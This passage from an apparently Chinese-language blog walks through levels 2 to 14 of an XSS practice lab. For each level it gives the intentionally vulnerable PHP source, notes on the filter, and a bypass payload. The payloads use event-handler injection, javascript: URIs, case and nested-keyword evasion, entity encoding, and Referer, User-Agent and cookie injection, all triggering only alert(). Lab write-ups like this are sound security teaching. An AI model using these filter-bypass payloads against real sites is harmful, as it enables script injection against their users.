html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;哎哟 不错哦！&quot;); window.location.href=&quot;level3.php?writing=苦尽甘来&quot;; }&lt;/script&gt;&lt;title&gt;第2关&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;第2关 窒息的操作&lt;/h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form action=level2.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.$str.&#39;&quot;&gt;&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/688da926-8a0b-452a-9a2b-82ba919328fb.jpg&quot;&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析:"></a>分析:</h3><p>用htmlspecialchars()函数，之前做过，会html实体化，&lt;&gt;会被转义<br>可以尝试”来闭合”</p><h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload:"></a>payload:</h3><pre><code>&quot; onclick=alert(&#39;XSS&#39;) //&quot; onclick=alert(&#39;XSS&#39;) &quot;</code></pre><h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><h3 id="查看源码-2"><a href="#查看源码-2" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;哎哟 不错哦！&quot;); window.location.href=&quot;level4.php?keyword=宁静致远&quot;; }&lt;/script&gt;&lt;title&gt;第3关&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;第3关 这该咋办啊&lt;/h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;&lt;form action=level3.php method=GET&gt;&lt;input name=keyword  value=&#39;&quot;.htmlspecialchars($str).&quot;&#39;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&quot;;?&gt;&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/ee7a688a-d75e-4ed7-8a79-96e62d3127e2.png&quot; width=&quot;15%&quot;&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析:"></a>分析:</h3><p>和第二关类似，只是变成了单引号，闭合单引号即可</p><h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload:"></a>payload:</h3><pre><code>&#39; onclick=alert(&#39;xss&#39;) &#39;&#39; onclick=alert(&#39;xs&#39;) //</code></pre><h2 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h2><h3 id="查看源码-3"><a href="#查看源码-3" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;哎哟 不错哦！&quot;); window.location.href=&quot;level5.php?keyword=逆水行舟&quot;; }&lt;/script&gt;&lt;title&gt;第4关&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;第4关 生无可恋&lt;/h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form action=level4.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.$str3.&#39;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/0d3f0d24-a861-4d20-97da-f807ea842be8.jpg&quot;&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str3).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析:"></a>分析:</h3><p>在第二关的基础上进行了&lt; &gt;的过滤，但第二关payload没有 &lt; &gt;仍然可以使用</p><h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload:"></a>payload:</h3><pre><code>&quot; onclick=alert(&#39;XSS&#39;) //&quot; onclick=alert(&#39;XSS&#39;) &quot;</code></pre><h2 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h2><h3 id="查看源码-4"><a href="#查看源码-4" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;哎哟 不错哦！&quot;); window.location.href=&quot;level6.php?keyword=柳暗花明&quot;; }&lt;/script&gt;&lt;title&gt;第5关&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;第5关 没错又是搜索&lt;/h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form action=level5.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.$str3.&#39;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/cb30e912-eabc-4357-89eb-49e8de1b1961.jpg&quot;&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str3).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析:"></a>分析:</h3><p>strtolower()函数，把字符转换为小写，接着替换script标签和on使这个两个事件没法使用，但仍可以闭合引号，所以要使用其他标签通过javascript:alert(‘xss’)来触发弹出<br><img src="https://Lmg66.github.io/img/131.png" alt="图片"><br><img src="https://Lmg66.github.io/img/132.png" alt="图片"></p><h3 id="payload-4"><a href="#payload-4" class="headerlink" title="payload:"></a>payload:</h3><pre><code>&quot;&gt;&lt;a href=javascript:alert(&#39;xss&#39;) &quot;&quot;&gt;&lt;a href=javascript:alert(&#39;xss&#39;) //</code></pre><h2 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h2><h3 id="查看源码-5"><a href="#查看源码-5" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;哎哟 不错哦！&quot;); window.location.href=&quot;level7.php?keyword=持之以恒&quot;; }&lt;/script&gt;&lt;title&gt;第6关&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;第6关 嗯 还是搜索&lt;/h1&gt;&lt;?phpini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form action=level6.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.$str6.&#39;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/92847238-8dda-473f-9c04-83986de1472a.jpg&quot;&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str6).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析:"></a>分析:</h3><p>替换了script标签,on,src,data,herf,且html实体化看起来似乎没问题，但相比前几关发现没有转换为小写，所以可大小写来绕过匹配</p><h3 id="payload-5"><a href="#payload-5" class="headerlink" title="payload:"></a>payload:</h3><pre><code>&quot; ONclick=alert(&#39;XSS&#39;) //&quot;&gt;&lt;a Href=javascript:alert(&#39;XSS&#39;) //</code></pre><h2 id="第7关"><a href="#第7关" class="headerlink" title="第7关"></a>第7关</h2><h3 id="查看源码-6"><a href="#查看源码-6" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;哎哟 不错哦！&quot;); window.location.href=&quot;level8.php?keyword=笨鸟先飞&quot;; }&lt;/script&gt;&lt;title&gt;第7关&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;第7关 猜一猜下面题目还有搜索嘛&lt;/h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str =strtolower( $_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form action=level7.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.$str6.&#39;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/17532328-f4cc-4bca-b283-c7f7b5a13f80.jpg&quot; width=&quot;20%&quot;&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str6).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析:"></a>分析:</h3><p>get方式传入keyword，strtolowe()函数变为小写，然后replace()函数匹配script，on，src，data，href，但是只是匹配了一次，所以可以嵌套绕过，最后htmlspecialchars(),所以&lt; &gt; 不能用，尝试闭合”</p><h3 id="payload-6"><a href="#payload-6" class="headerlink" title="payload:"></a>payload:</h3><pre><code>&quot; oonnclick=alert(&#39;XSS&#39;) //</code></pre><h2 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h2><h3 id="查看源码-7"><a href="#查看源码-7" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;哎哟 不错哦！&quot;); window.location.href=&quot;level9.php?keyword=水滴石穿&quot;; }&lt;/script&gt;&lt;title&gt;第8关&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;第8关 老铁要和我换友链嘛？&lt;/h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);echo &#39;&lt;center&gt;&lt;form action=level8.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;&lt;?php echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#39;.$str7.&#39;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;?&gt;&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/d2d2080f-746c-4276-9f63-585fc4fd4a9c.jpg&quot; width=&quot;20%&quot;&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="分析-7"><a href="#分析-7" class="headerlink" title="分析:"></a>分析:</h3><p>get方式传入keyword，strtolower()转换为小写，然后replace替换script，on，src，data，href，”（”号html实体化了）,然后发现又html实体化输入，似乎没有问题，然后发现友情链接,没有html实体化输入，可以尝试在这个位置绕过，但是都被过滤了，尝试编码绕过对JavaScript;alert(‘xss’)编码(呸，不是编码)转义<a href="https://www.jianshu.com/p/6dcefb2a59b2(参考链接)，目的是绕过replace，然后仍能被html解析" target="_blank" rel="noopener">https://www.jianshu.com/p/6dcefb2a59b2(参考链接)，目的是绕过replace，然后仍能被html解析</a><br><img src="https://Lmg66.github.io/img/133.png" alt="图片"></p><h3 id="payload-7"><a href="#payload-7" class="headerlink" title="payload:"></a>payload:</h3><pre><code>javascrip&amp;#x74:alert(&#39;xss&#39;)javascrip&amp;#x09t:alert(&#39;XSS&#39;)</code></pre><h2 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h2><h3 id="查看源码-8"><a href="#查看源码-8" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;哎哟 不错哦！&quot;); window.location.href=&quot;level10.php?keyword=持之以恒&quot;; }&lt;/script&gt;&lt;title&gt;第9关&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;第9关 添加友连again&lt;/h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);echo &#39;&lt;center&gt;&lt;form action=level9.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;&lt;?phpif(false===strpos($str7,&#39;http://&#39;)){  echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;        }else{  echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#39;.$str7.&#39;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;}?&gt;&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/51fb4236-2965-42ab-851e-0ec266b3c3ba.jpg&quot;&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="分析-8"><a href="#分析-8" class="headerlink" title="分析:"></a>分析:</h3><p>和第八关相同，只是判断链接是否合法，加上http://就可以了</p><h3 id="payload-8"><a href="#payload-8" class="headerlink" title="payload:"></a>payload:</h3><pre><code>javascrip&amp;#x74:alert(&#39;xss&#39;) //http://</code></pre><h2 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h2><h3 id="查看源码-9"><a href="#查看源码-9" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;哎哟 不错哦！&quot;); window.location.href=&quot;level11.php?keyword=自强不息&quot;; }&lt;/script&gt;&lt;title&gt;第10关&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;第10关 嗯 搜索又出现了&lt;/h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str11 = $_GET[&quot;t_sort&quot;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/fed9cb1c-3111-49a8-b111-16081ac4b16c.jpg&quot;&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="分析-9"><a href="#分析-9" class="headerlink" title="分析:"></a>分析:</h3><p>传入keyword和t_sort,keyword没有过滤，但是html实体化输出，而且没在标签内，所以应该没问题，看t_sort，过滤了&lt; &gt; ,而且没有实体化输出<br>尝试闭合引号</p><h3 id="payload-9"><a href="#payload-9" class="headerlink" title="payload:"></a>payload:</h3><p><code>?keyword=123&amp;t_sort=&quot; type=&quot;text&quot; onclick=alert(&#39;XSS&#39;) //</code></p><h2 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h2><h3 id="查看源码-10"><a href="#查看源码-10" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;哎哟 不错哦！&quot;); window.location.href=&quot;level12.php?keyword=破釜沉舟&quot;; }&lt;/script&gt;&lt;title&gt;第11关&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;第11关 为什么这么多搜索呢&lt;/h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_SERVER[&#39;HTTP_REFERER&#39;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_ref&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/60a6e17f-c823-40c3-ab84-502b2f905456.jpg&quot;&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="分析-10"><a href="#分析-10" class="headerlink" title="分析:"></a>分析:</h3><p>str和str00都html实体化而且不在script标签内部，且闭合为’,应该无解，然后发现str33，没有实体化，$_SERVER[‘HTTP_REFERER’]获取httpreferer信息，只是过滤了&lt; &gt; ,可以闭合双引号来绕过,不过我没明白这题啥用</p><h3 id="payload-10"><a href="#payload-10" class="headerlink" title="payload:"></a>payload:</h3><p><code>&quot; type = &quot;text&quot; onclick=alert(&#39;xss&#39;)//</code><br><img src="https://Lmg66.github.io/img/134.png" alt="图片"></p><h2 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h2><h3 id="查看源码-11"><a href="#查看源码-11" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;哎哟 不错哦！&quot;); window.location.href=&quot;level13.php?keyword=矢志不渝&quot;; }&lt;/script&gt;&lt;title&gt;第12关&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;第12关 黑人问号&lt;/h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_SERVER[&#39;HTTP_USER_AGENT&#39;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_ua&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/f4558b8c-778b-4dd8-bef6-425766f9d178.jpg&quot;&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="分析-11"><a href="#分析-11" class="headerlink" title="分析:"></a>分析:</h3><p>和上一关一样，xss位置变一下</p><h3 id="payload-11"><a href="#payload-11" class="headerlink" title="payload:"></a>payload:</h3><p><code>&quot; type = &quot;text&quot; onclick=alert(&#39;xss&#39;)//</code><br><img src="https://Lmg66.github.io/img/135.png" alt="图片"></p><h2 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h2><h3 id="查看源码-12"><a href="#查看源码-12" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;哎哟 不错哦！&quot;); window.location.href=&quot;level14.php&quot;; }&lt;/script&gt;&lt;title&gt;第13关&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;第13关 做题好爽啊&lt;/h1&gt;&lt;?php setcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time()+3600);ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_COOKIE[&quot;user&quot;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_cook&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/c048c2e3-7937-478b-9781-0ee4d7214648.jpg&quot;&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="分析-12"><a href="#分析-12" class="headerlink" title="分析:"></a>分析:</h3><p>$_COOKIE[“user”];获取cookie，然后过滤&lt; &gt; 没有实体化输入，尝试闭合双引号</p><h3 id="payload-12"><a href="#payload-12" class="headerlink" title="payload:"></a>payload:</h3><pre><code>user=&quot; type = &quot;text&quot; onclick=alert(&#39;xss&#39;)//</code></pre><p><img src="https://Lmg66.github.io/img/136.png" alt="图片"></p><h2 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h2><h3 id="查看源码-13"><a href="#查看源码-13" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script src=&quot;https://chao.jsanhuan.cn/angular.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;哎哟 不错哦！&quot;); window.location.href=&quot;level15.php?keyword=业精于勤&quot;; }&lt;/script&gt;&lt;title&gt;第14关&lt;/title&gt;&lt;/head&gt;&lt;h1 align=center&gt;第14关 恭喜你快要通关了&lt;/h1&gt;&lt;p align=center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/54c95d0f-037b-4885-a3f4-f8a3ad5c9341.jpg&quot; width=&quot;20%&quot;&gt;&lt;/p&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;src&quot;];echo &#39;&lt;body&gt;&lt;span class=&quot;ng-include:&#39;.htmlspecialchars($str).&#39;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#39;;?&gt;</code></pre><h3 id="分析-13"><a href="#分析-13" class="headerlink" title="分析:"></a>分析:</h3><p>传入src，然后实体化输出，然后似乎无解，仔细看前面ng-include:,<br>ng-include 指令用于包含外部的 HTML 文件。包含的内容将作为指定元素的子节点。ng-include 属性的值可以是一个表达式，返回一个文件名。默认情况下，包含的文件需要包含在同一个域名下。所以传入其他关的xss，不过不知道这有啥用既然其他地点有xss<br><img src="https://Lmg66.github.io/img/137.png" alt="图片"></p><h3 id="payload-13"><a href="#payload-13" class="headerlink" title="payload:"></a>payload:</h3><pre><code>src=&#39;level1.php?name=&lt;img src=x onerror=alert(1)&gt;&#39;</code></pre><p>由于引用的js代码失败，所以我没成功，但云靶机是对的，云靶机地址：<a href="https://www.xss.tv/" target="_blank" rel="noopener">https://www.xss.tv/</a><br><img src="https://Lmg66.github.io/img/138.png" alt="图片"></p><h2 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a>第十五关</h2><h3 id="查看源码-14"><a href="#查看源码-14" 